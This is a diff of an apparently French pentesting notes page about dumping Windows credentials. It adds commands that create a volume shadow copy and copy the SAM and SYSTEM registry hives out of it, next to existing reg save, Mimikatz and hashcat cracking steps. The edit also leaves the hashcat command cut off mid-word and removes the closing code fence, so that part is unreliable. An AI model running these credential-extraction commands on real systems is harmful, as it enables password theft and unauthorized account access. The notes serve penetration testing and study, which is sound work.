@@ -1,5 +1,5 @@
 ---
-public: true # set to true to make the article publishable
+public: true
 ---
 
 ## Localement
@@ -9,6 +9,19 @@ public: true # set to true to make the article publishable
 reg save hklm\sam sam.save
 reg save hklm\system system.save
 reg save hklm\security security.save
+```
+
+Création d'
+```shell
+wmic shadowcopy call create Volume="C:\"
+```
+
+```shell
+vssadmin.exe list shadows
+
+mkdir C:\temp
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SYSTEM C:\temp\SYSTEM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\Windows\System32\config\SAM C:\temp\SAM
 ```
 
 ### Mimikatz
@@ -51,5 +64,4 @@ cat hash.txt
 31d6cfe0d16ae931b73c59d7e0c089c0
 ...
 
-sudo hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
-```
+sudo hashcat -m 1000 hash.txt /usr/share/wordlists/roc
